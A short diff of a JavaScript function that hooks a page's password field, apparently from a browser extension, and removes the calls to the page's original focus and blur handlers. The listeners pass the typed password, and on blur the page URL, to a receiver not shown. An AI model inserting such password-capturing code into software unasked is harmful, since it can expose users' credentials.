@@ -54,9 +54,6 @@ function attachHandlers(passwordElem) {
                     pos: findPos(this),
                     password: this.value
                 });
-
-            if (oldFocus)
-                oldFocus.apply(this,arguments);
         });
 
     passwordElem.addEventListener('blur', function() {
@@ -70,8 +67,5 @@ function attachHandlers(passwordElem) {
                 href: window.location.href,
                 password: this.value
             });
-
-        if (oldBlur)
-            oldBlur.apply(this,arguments);
     });
 }
